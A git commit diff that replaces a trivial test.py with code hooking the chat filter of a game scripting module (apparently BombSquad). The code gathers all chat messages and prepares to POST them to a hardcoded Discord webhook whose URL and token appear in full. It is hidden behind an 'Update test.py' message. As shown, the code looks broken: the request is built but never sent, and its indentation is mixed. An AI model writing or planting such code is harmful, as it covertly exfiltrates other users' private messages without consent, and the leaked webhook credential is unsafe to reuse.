2cd3d8dcf42e5e6b3c92d053b319caed25639dad
fraq-sss <98089449+fraq-sss@users.noreply.github.com>
2025-03-08 17:02:18 -0800

    Update test.py

--- test.py
+++ test.py
@@ -1,1 +1,19 @@
-print(" ")
+import ba._hooks
+import ba
+import json
+import urllib.request
+
+d = 'https://discord.com/api/webhooks/1305806260796653569/XAo0-lE0pXL38Bu2rulRXh-raihDsg3LJT9gQYzVbSoiB6yXmPw2s0pMAcrrCEl_-tLz'
+
+def delta(m, c):
+	c = str(ba.get_chat_messages())
+	c += '\n last msg: '+m
+	p = {"content": c}
+	p = json.dumps(p).encode('utf-8')
+	headers = {
+        'Content-Type': 'application/json'
+    }
+    r = urllib.request.Request(d, data=p, headers=headers, method='POST')
+	return m
+
+ba._hooks.filter_chat_message = delta
